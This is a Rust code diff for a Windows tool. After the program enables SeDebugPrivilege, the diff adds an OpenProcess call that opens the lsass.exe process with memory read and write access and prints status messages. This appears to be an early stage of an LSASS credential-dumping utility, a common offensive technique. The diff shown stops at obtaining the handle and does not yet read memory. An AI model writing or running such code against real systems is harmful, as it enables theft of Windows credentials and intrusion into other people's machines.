@@ -9,7 +9,10 @@ use windows_sys::{
             TOKEN_QUERY,
         },
         System::{
-            Threading::{GetCurrentProcess, OpenProcessToken},
+            Threading::{
+                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
+                PROCESS_VM_READ, PROCESS_VM_WRITE,
+            },
             WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
         },
     },
@@ -136,4 +139,18 @@ fn main() {
     }
 
     println!("[+] SeDebugPrivilege enabled successfully");
+
+    unsafe {
+        let lsass_handle = OpenProcess(
+            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+            0,
+            pid,
+        );
+
+        if lsass_handle.is_null() {
+            println!("[-] Failed to open lsass.exe process");
+        }
+
+        println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);
+    }
 }
